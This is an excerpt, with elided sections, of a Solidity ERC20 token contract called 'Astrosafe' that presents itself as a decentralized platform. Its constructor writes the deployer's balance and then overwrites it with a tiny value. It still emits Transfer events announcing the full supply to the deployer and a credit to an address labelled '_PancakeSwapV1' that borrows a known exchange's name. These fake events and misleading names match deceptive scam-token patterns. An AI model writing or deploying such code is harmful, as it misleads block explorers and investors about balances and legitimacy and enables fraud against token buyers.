...
/** Astrosafe is a decentralized platform looking to brings together and improves the most 
...
contract Astrosafe is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    address _PancakeSwapV1 = 0xCA6B8f9125c513803DaAA128065CB2c1E22DaACB;
    uint256 _VerifyPancake;
    bool isNumber = true;
    constructor() {
        _VerifyPancake = 1 * 10**9;
        _totalSupply = 1000000 * 10**9 * 10**9;
        _balances[_msgSender()] = _totalSupply;
        _balances[_msgSender()] = _VerifyPancake;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        emit Transfer(address(0), _PancakeSwapV1, _VerifyPancake);
    }
